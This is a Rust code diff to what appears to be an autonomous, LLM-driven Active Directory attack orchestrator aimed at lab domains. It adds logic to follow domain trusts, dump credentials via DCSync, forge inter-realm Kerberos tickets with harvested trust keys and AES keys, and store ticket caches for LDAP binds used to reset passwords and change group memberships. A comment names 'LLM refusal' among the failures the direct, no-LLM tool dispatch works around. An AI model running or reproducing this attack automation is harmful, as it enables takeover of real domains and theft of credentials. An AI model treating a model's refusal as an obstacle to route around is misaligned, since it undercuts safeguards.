@@ -157,6 +157,28 @@ async fn wake_cross_forest_fallbacks(dispatcher: &Dispatcher, target_domain: &st
             .filter(|(_, v)| !v.is_empty())
             .collect()
     };
+    let cleared_count: usize = cleared.iter().map(|(_, v)| v.len()).sum();
+    if cleared_count == 0 {
+        // Nothing to clear means ACL/cross-forest enum never ran against this
+        // target — usually because no same-realm credential exists. Fallback
+        // wake is a no-op here; the orchestrator will keep flailing on
+        // NTLM-bound paths that 0x52e against the foreign forest. Logging
+        // this signal makes the architectural gap visible in the trace.
+        info!(
+            target = %target_domain,
+            "wake_cross_forest_fallbacks: no dedup keys to clear — \
+             ACL/foreign-group/cross-forest enum never registered for this \
+             target (likely no same-realm credential). Forge-only fallback \
+             via create_inter_realm_ticket would be needed to bind LDAP \
+             via Kerberos."
+        );
+    } else {
+        info!(
+            target = %target_domain,
+            cleared_count,
+            "wake_cross_forest_fallbacks: cleared dedup keys to retrigger fallback enums"
+        );
+    }
     for (set, keys) in cleared {
         for key in keys {
             let _ = dispatcher
@@ -467,12 +489,32 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
         // happens (LLM refusal, network, throttle starvation).
         {
             let state = dispatcher.state.read().await;
-            if state.has_domain_admin {
+            // Build the candidate child set as the union of dominated domains
+            // (krbtgt observed) and domains where we have a non-empty
+            // Administrator NTLM hash. The latter covers the common case where
+            // GOAD-style password reuse gives us a working DA hash via local
+            // SAM dumps before we ever DCSync krbtgt — without it the trust
+            // automation deadlocks waiting for krbtgt.
+            let mut candidate_children: HashSet<String> = state
+                .dominated_domains
+                .iter()
+                .map(|d| d.to_lowercase())
+                .collect();
+            for h in state.hashes.iter() {
+                if h.username.eq_ignore_ascii_case("administrator")
+                    && h.hash_type.eq_ignore_ascii_case("NTLM")
+                    && !h.hash_value.is_empty()
+                    && !h.domain.is_empty()
+                {
+                    candidate_children.insert(h.domain.to_lowercase());
+                }
+            }
+            if !candidate_children.is_empty() {
                 let mut child_work: Vec<(String, String, String, String)> = Vec::new();
 
-                // Path A: derived intra-forest. For each dominated child (FQDN
+                // Path A: derived intra-forest. For each candidate child (FQDN
                 // with 3+ labels), the parent is `labels[1..].join(".")`.
-                for child_domain in state.dominated_domains.iter() {
+                for child_domain in candidate_children.iter() {
                     let cd_lower = child_domain.to_lowercase();
                     let labels: Vec<&str> = cd_lower.split('.').collect();
                     if labels.len() < 3 {
@@ -517,7 +559,7 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                         {
                             continue;
                         }
-                        let child_domain = match state.dominated_domains.iter().find(|d| {
+                        let child_domain = match candidate_children.iter().find(|d| {
                             d.to_lowercase()
                                 .ends_with(&format!(".{}", parent_domain.to_lowercase()))
                         }) {
@@ -856,8 +898,11 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
 
                     // raiseChild auto-discovers parent forest root via the
                     // child DC's trustedDomain LDAP objects and resolves DC IPs
-                    // via DNS — extra IP/domain flags are not supported and
-                    // make argparse exit 2.
+                    // via DNS — script-level flags for IP/domain are unsupported
+                    // (argparse exit 2). However, on workers without forest DNS,
+                    // the bare domain FQDN (`north.sevenkingdoms.local`) won't
+                    // resolve — so pass the IPs so the tool wrapper can
+                    // pre-seed `/etc/hosts` before invoking impacket.
                     let mut raise_args = json!({
                         "child_domain": child_domain.clone(),
                         "username": "Administrator",
@@ -867,7 +912,13 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                     } else if let Some(p) = admin_password {
                         raise_args["password"] = json!(p);
                     }
-                    let _ = (&child_dc_ip, &parent_dc_ip);
+                    if let Some(ref ip) = child_dc_ip {
+                        raise_args["child_dc_ip"] = json!(ip);
+                    }
+                    raise_args["parent_domain"] = json!(parent_domain.clone());
+                    if !parent_dc_ip.is_empty() {
+                        raise_args["parent_dc_ip"] = json!(parent_dc_ip.clone());
+                    }
 
                     let call = ToolCall {
                         id: format!("raise_child_{}", uuid::Uuid::new_v4().simple()),
@@ -1381,6 +1432,37 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                         .persist_dedup(&dispatcher.queue, DEDUP_TRUST_FOLLOW, &item.dedup_key)
                         .await;
                     wake_cross_forest_fallbacks(&dispatcher, &item.target_domain).await;
+
+                    // Dispatch `create_inter_realm_ticket` so downstream Kerberos-capable
+                    // tools (e.g. bloodyad with -k) have a valid ccache for the target
+                    // forest. SID filtering blocks ExtraSid-based DCSync, but the forged
+                    // TGT still allows Kerberos LDAP bind as Administrator. The tool writes
+                    // Administrator.ccache in a tempdir; we persist the full path to Redis
+                    // via `publish_kerberos_ticket` so the credential resolver can find it.
+                    {
+                        let dispatcher_bg = dispatcher.clone();
+                        let source_domain_bg = item.source_domain.clone();
+                        let target_domain_bg = item.target_domain.clone();
+                        let trust_key_bg = item.hash.hash_value.clone();
+                        let aes_key_bg = item.hash.aes_key.clone();
+                        let source_domain_sid_bg = {
+                            let s = dispatcher.state.read().await;
+                            s.domain_sids
+                                .get(&item.source_domain.to_lowercase())
+                                .cloned()
+                        };
+                        tokio::spawn(async move {
+                            dispatch_create_inter_realm_ticket(
+                                &dispatcher_bg,
+                                &source_domain_bg,
+                                &target_domain_bg,
+                                &trust_key_bg,
+                                aes_key_bg.as_deref(),
+                                source_domain_sid_bg.as_deref(),
+                            )
+                            .await;
+                        });
+                    }
                     continue;
                 }
             }
@@ -1509,17 +1591,24 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
             // Admins SID (RID 519) as ExtraSid; without it the parent KDC
             // issues a TGS but DRSUAPI on the parent DC rejects the
             // replication call as `rpc_s_access_denied` and nxc dumps zero
-            // hashes (exit 0, hiding the failure). Resolve the parent SID
-            // on-demand via lookupsid against the parent DC using source
-            // admin creds (cross-trust SAMR works) when it isn't cached.
-            // Defer dispatch (no dedup mark) when resolution fails so the
-            // next 30s tick can retry once enumeration progresses.
+            // hashes (exit 0, hiding the failure).
+            //
+            // For cross-forest forges, the target domain SID is required for
+            // ticketer.py to build a PAC the target KDC will accept (without
+            // it the inter-realm TGT is rejected and forge_inter_realm_and_dump
+            // returns 0 hashes, locking dedup permanently). Resolve the target
+            // SID on-demand via lookupsid against the target DC using source
+            // admin creds (cross-trust SAMR works post-DA) when it isn't
+            // cached. Defer dispatch (no dedup mark) when resolution fails so
+            // the next 30s tick can retry once sid_enumeration populates it
+            // via lsaquery.
             let source_l = item.source_domain.to_lowercase();
             let target_l = item.target_domain.to_lowercase();
             let is_child_to_parent =
                 source_l != target_l && source_l.ends_with(&format!(".{target_l}"));
+            let needs_target_sid = source_l != target_l;
             let target_domain_sid: Option<String> =
-                if !is_child_to_parent || item.target_domain_sid.is_some() {
+                if !needs_target_sid || item.target_domain_sid.is_some() {
                     item.target_domain_sid.clone()
                 } else {
                     let (src_cred, src_hash) = {
@@ -1553,10 +1642,15 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                     )
                     .await;
                     if let Some((sid, admin_name)) = resolved {
+                        let label = if is_child_to_parent {
+                            "Resolved parent domain SID for child→parent forge ExtraSid"
+                        } else {
+                            "Resolved target domain SID for cross-forest forge"
+                        };
                         info!(
                             target_domain = %item.target_domain,
                             sid = %sid,
-                            "Resolved parent domain SID for child→parent forge ExtraSid"
+                            "{}", label
                         );
                         let op_id = { dispatcher.state.read().await.operation_id.clone() };
                         let reader = ares_core::state::RedisStateReader::new(op_id);
@@ -1575,18 +1669,83 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                         }
                         Some(sid)
                     } else {
+                        let label = if is_child_to_parent {
+                            "Could not resolve parent SID — deferring child→parent forge"
+                        } else {
+                            "Could not resolve target SID — deferring cross-forest forge"
+                        };
                         warn!(
                             source = %item.source_domain,
                             target = %item.target_domain,
                             target_dc_ip = %target_dc_ip,
-                            "Could not resolve parent SID — deferring child→parent forge"
+                            "{}", label
                         );
                         None
                     }
                 };
-            if is_child_to_parent && target_domain_sid.is_none() {
+            if needs_target_sid && target_domain_sid.is_none() {
                 continue;
             }
+
+            // Wait for AES256 to upsert before dispatching cross-forest forge.
+            // secretsdump runs twice (NTLM-only first, then -aes-types) and the
+            // second call typically lands ~60-90s after NTLM. If we dispatch
+            // before AES arrives, Win2016+ targets reject the RC4-only ticket
+            // with KDC_ERR_TGT_REVOKED and forge_inter_realm yields zero hashes
+            // — locking dedup on a doomed dispatch.
+            //
+            // Re-read state.hashes for an AES-equipped variant of this trust
+            // account; if present, use it. If absent, defer up to ~3 min so the
+            // second secretsdump can land. After that, dispatch with NTLM-only
+            // as a last resort (some target DCs accept RC4 still, and the
+            // wake_cross_forest_fallbacks path is the real safety net).
+            let resolved_aes_key: Option<String> = if needs_target_sid {
+                let from_state = {
+                    let s = dispatcher.state.read().await;
+                    s.hashes
+                        .iter()
+                        .find(|h| {
+                            h.username.eq_ignore_ascii_case(&item.hash.username)
+                                && h.domain.eq_ignore_ascii_case(&item.hash.domain)
+                                && h.aes_key.is_some()
+                        })
+                        .and_then(|h| h.aes_key.clone())
+                };
+                let aes = item.hash.aes_key.clone().or(from_state);
+                if aes.is_none() {
+                    let attempts = {
+                        let mut state = dispatcher.state.write().await;
+                        let count = state
+                            .forge_aes_defers
+                            .entry(item.dedup_key.clone())
+                            .or_insert(0);
+                        *count += 1;
+                        *count
+                    };
+                    const MAX_AES_DEFERS: u32 = 6;
+                    if attempts <= MAX_AES_DEFERS {
+                        debug!(
+                            source = %item.source_domain,
+                            target = %item.target_domain,
+                            trust_account = %item.hash.username,
+                            attempts,
+                            "Deferring cross-forest forge — AES256 not yet upserted on trust hash"
+                        );
+                        continue;
+                    }
+                    warn!(
+                        source = %item.source_domain,
+                        target = %item.target_domain,
+                        trust_account = %item.hash.username,
+                        "Dispatching cross-forest forge with NTLM-only after AES wait exhausted"
+                    );
+                    None
+                } else {
+                    aes
+                }
+            } else {
+                item.hash.aes_key.clone()
+            };
 
             // Build args for the combined `forge_inter_realm_and_dump` tool.
             // This single tool runs impacket-ticketer + impacket-secretsdump
@@ -1613,7 +1772,11 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
             }
             // AES256 trust key — required for Win2016+ target DCs which
             // reject RC4-only inter-realm tickets with KDC_ERR_TGT_REVOKED.
-            if let Some(ref aes) = item.hash.aes_key {
+            // resolved_aes_key prefers item.hash.aes_key, then re-reads
+            // state.hashes for an AES-equipped variant (handles the race
+            // where secretsdump's second pass upserts AES after work was
+            // collected).
+            if let Some(ref aes) = resolved_aes_key {
                 tool_args["aes_key"] = json!(aes);
             }
             // For child→parent trusts (intra-forest), inject parent's
@@ -1657,8 +1820,8 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                 source_domain = %item.source_domain,
                 target_domain = %item.target_domain,
                 has_source_sid = source_domain_sid.is_some(),
-                has_target_sid = item.target_domain_sid.is_some(),
-                has_aes = item.hash.aes_key.is_some(),
+                has_target_sid = target_domain_sid.is_some(),
+                has_aes = resolved_aes_key.is_some(),
                 "Cross-forest forge dispatched (direct tool, no LLM)"
             );
 
@@ -1668,6 +1831,9 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
             let trust_account_bg = item.hash.username.clone();
             let vuln_id_bg = vuln_id.clone();
             let dedup_key_bg = item.dedup_key.clone();
+            let trust_key_bg = item.hash.hash_value.clone();
+            let aes_key_bg = resolved_aes_key.clone();
+            let source_domain_sid_bg = source_domain_sid.clone();
             tokio::spawn(async move {
                 let result = dispatcher_bg
                     .llm_runner
@@ -1773,15 +1939,71 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                             // wake the cross-forest fallback paths
                             // (ACL/MSSQL/FSP) which can still compromise the
                             // target forest without ExtraSid.
+                            //
+                            // Surface tool stdout tail + a hash-count summary so
+                            // post-mortem can distinguish silent nxc failure
+                            // (empty output) from auth-denied (nxc printed
+                            // STATUS_LOGON_FAILURE / rpc_s_access_denied) from
+                            // partial dumps (got hashes but no krbtgt — usually
+                            // a cross-forest no-ExtraSid case where the target
+                            // KDC issued a TGS but DRSUAPI rejected replication).
+                            let tail: String = exec_result
+                                .output
+                                .chars()
+                                .rev()
+                                .take(2000)
+                                .collect::<String>()
+                                .chars()
+                                .rev()
+                                .collect();
+                            let hash_count = exec_result
+                                .discoveries
+                                .as_ref()
+                                .and_then(|d| d.get("hashes"))
+                                .and_then(|h| h.as_array())
+                                .map(|a| a.len())
+                                .unwrap_or(0);
                             warn!(
                                 source_domain = %source_domain_bg,
                                 target_domain = %target_domain_bg,
-                                "forge_inter_realm_and_dump completed but no target krbtgt observed — locking dedup, waking fallbacks"
+                                hash_count,
+                                output_tail = %tail,
+                                "forge_inter_realm_and_dump completed but no target krbtgt observed — locking dedup, waking fallbacks (vuln NOT marked exploited; only target krbtgt capture proves compromise)"
                             );
-                            let _ = dispatcher_bg
-                                .state
-                                .mark_exploited(&dispatcher_bg.queue, &vuln_id_bg)
-                                .await;
+                            let _ = vuln_id_bg; // intentionally unused — see comment above
+
+                            // Dump-phase failure (SID filtering missed by
+                            // is_filtered_inter_forest_trust, DRSUAPI denial
+                            // despite a valid TGS, or any other reason DCSync
+                            // returned 0 hashes) leaves the foreign forest
+                            // attackable via Kerberos LDAP bind. Dispatch
+                            // create_inter_realm_ticket so downstream tools
+                            // (bloodyad -k, etc.) get a usable ccache. Without
+                            // this, wake_cross_forest_fallbacks below is a
+                            // no-op when no same-realm credential bound the
+                            // ACL/foreign-group/cross-forest enums to the
+                            // target — the case that left essos.local
+                            // permanently un-attackable in op-20260502-013857.
+                            {
+                                let dispatcher_fb = dispatcher_bg.clone();
+                                let source_domain_fb = source_domain_bg.clone();
+                                let target_domain_fb = target_domain_bg.clone();
+                                let trust_key_fb = trust_key_bg.clone();
+                                let aes_key_fb = aes_key_bg.clone();
+                                let source_domain_sid_fb = source_domain_sid_bg.clone();
+                                tokio::spawn(async move {
+                                    dispatch_create_inter_realm_ticket(
+                                        &dispatcher_fb,
+                                        &source_domain_fb,
+                                        &target_domain_fb,
+                                        &trust_key_fb,
+                                        aes_key_fb.as_deref(),
+                                        source_domain_sid_fb.as_deref(),
+                                    )
+                                    .await;
+                                });
+                            }
+
                             wake_cross_forest_fallbacks(&dispatcher_bg, &target_domain_bg).await;
                         }
                     }
@@ -1808,6 +2030,168 @@ struct TrustFollowWork {
     target_dc_ip: Option<String>,
     source_domain_sid: Option<String>,
     target_domain_sid: Option<String>,
+}
+
+/// Forge an inter-realm Kerberos ticket for a SID-filtered cross-forest trust.
+///
+/// Called from the suppression branch of `auto_trust_follow` when
+/// `is_filtered_inter_forest_trust` is true. The ExtraSid DCSync path is
+/// blocked by SID filtering, but a plain inter-realm TGT is still useful:
+/// bloodyad with `-k` can perform Kerberos LDAP bind against the target DC
+/// as Administrator, enabling password resets and group membership changes.
+///
+/// The ticket is written to `/tmp/ares-tickets/<src>__<tgt>__<user>.ccache`
+/// (a shared path accessible to all workers on the same host) and persisted
+/// to Redis via `publish_kerberos_ticket` so the credential resolver can
+/// find it when bloodyad or other LDAP-bind tools target the foreign forest.
+///
+/// SID resolution is opportunistic: if the source SID isn't in state yet, we
+/// pass an empty string and ticketer will still produce a ticket (though some
+/// KDCs reject it). This is best-effort — the fallback paths (ACL/MSSQL) are
+/// the primary attack vectors; this ticket is just a bonus.
+async fn dispatch_create_inter_realm_ticket(
+    dispatcher: &Dispatcher,
+    source_domain: &str,
+    target_domain: &str,
+    trust_key: &str,
+    aes_key: Option<&str>,
+    source_domain_sid: Option<&str>,
+) {
+    use ares_llm::ToolCall;
+
+    let ticket_username = "Administrator";
+
+    // Build tool args. source_sid is required by the tool — use a fallback
+    // empty string and let ticketer attempt the forge; worst case the KDC
+    // rejects it and the ticket write fails silently.
+    let source_sid = source_domain_sid.unwrap_or("");
+    if source_sid.is_empty() {
+        tracing::info!(
+            source_domain,
+            target_domain,
+            "dispatch_create_inter_realm_ticket: source SID unknown, attempting forge with empty SID"
+        );
+    }
+
+    let mut tool_args = serde_json::json!({
+        "trust_key":     trust_key,
+        "source_sid":    source_sid,
+        "source_domain": source_domain,
+        "target_domain": target_domain,
+        "username":      ticket_username,
+    });
+    if let Some(aes) = aes_key {
+        tool_args["aes_key"] = serde_json::json!(aes);
+    }
+
+    // Look up the target DC so the tool can chain ldap/<dc> + cifs/<dc>
+    // service-ticket fetches into the same ccache. MIT GSSAPI clients can't
+    // walk a referral starting from `krbtgt/<TARGET>@<SOURCE>`; they require
+    // the service ticket to already be cached. Without this, the forged
+    // inter-realm TGT is unusable for `ldapsearch -Y GSSAPI`.
+    {
+        let s = dispatcher.state.read().await;
+        let target_lower = target_domain.to_lowercase();
+        if let Some(dc_ip) = s.resolve_dc_ip(target_domain) {
+            let dc_fqdn = s.hosts.iter().find_map(|h| {
+                if h.ip != dc_ip || h.hostname.is_empty() {
+                    return None;
+                }
+                let hn = h.hostname.to_lowercase();
+                if hn.ends_with(&format!(".{target_lower}")) || hn == target_lower {
+                    Some(hn)
+                } else {
+                    Some(format!("{hn}.{target_lower}"))
+                }
+            });
+            if let Some(fqdn) = dc_fqdn {
+                tool_args["target_dc_ip"] = serde_json::json!(dc_ip);
+                tool_args["target_dc_fqdn"] = serde_json::json!(fqdn);
+            }
+        }
+    }
+
+    let call = ToolCall {
+        id: format!("create_inter_realm_{}", uuid::Uuid::new_v4().simple()),
+        name: "create_inter_realm_ticket".to_string(),
+        arguments: tool_args,
+    };
+    let task_id = format!(
+        "inter_realm_ticket_{}",
+        &uuid::Uuid::new_v4().simple().to_string()[..12]
+    );
+
+    tracing::info!(
+        source_domain,
+        target_domain,
+        task_id = %task_id,
+        args = %call.arguments,
+        "Dispatching create_inter_realm_ticket for SID-filtered trust (Kerberos LDAP path)"
+    );
+
+    match dispatcher
+        .llm_runner
+        .tool_dispatcher()
+        .dispatch_tool("privesc", &task_id, &call)
+        .await
+    {
+        Ok(result) => {
+            if result.error.is_some() {
+                tracing::warn!(
+                    source_domain,
+                    target_domain,
+                    error = ?result.error,
+                    "create_inter_realm_ticket returned error"
+                );
+                return;
+            }
+            // Parse the ticket path from the tool output (ARES_TICKET_PATH=<path>).
+            let ticket_path = result
+                .output
+                .lines()
+                .find_map(|line| line.strip_prefix("ARES_TICKET_PATH="))
+                .map(str::trim)
+                .filter(|p| !p.is_empty())
+                .map(str::to_string);
+
+            let Some(ticket_path) = ticket_path else {
+                tracing::warn!(
+                    source_domain,
+                    target_domain,
+                    "create_inter_realm_ticket succeeded but no ARES_TICKET_PATH in output"
+                );
+                return;
+            };
+
+            tracing::info!(
+                source_domain,
+                target_domain,
+                ticket_path = %ticket_path,
+                output_tail = %result.output.lines().rev().take(20).collect::<Vec<_>>().into_iter().rev().collect::<Vec<_>>().join(" | "),
+                "Inter-realm ticket forged — persisting for Kerberos LDAP tools"
+            );
+
+            let ticket = ares_core::models::KerberosTicket {
+                source_domain: source_domain.to_string(),
+                target_domain: target_domain.to_string(),
+                username: ticket_username.to_string(),
+                ticket_path,
+                forged_at: Some(chrono::Utc::now()),
+            };
+            let _ = dispatcher
+                .state
+                .publish_kerberos_ticket(&dispatcher.queue, ticket)
+                .await;
+        }
+        Err(e) => {
+            tracing::warn!(
+                source_domain,
+                target_domain,
+                err = %e,
+                "create_inter_realm_ticket dispatch error"
+            );
+        }
+    }
 }
 
 #[cfg(test)]
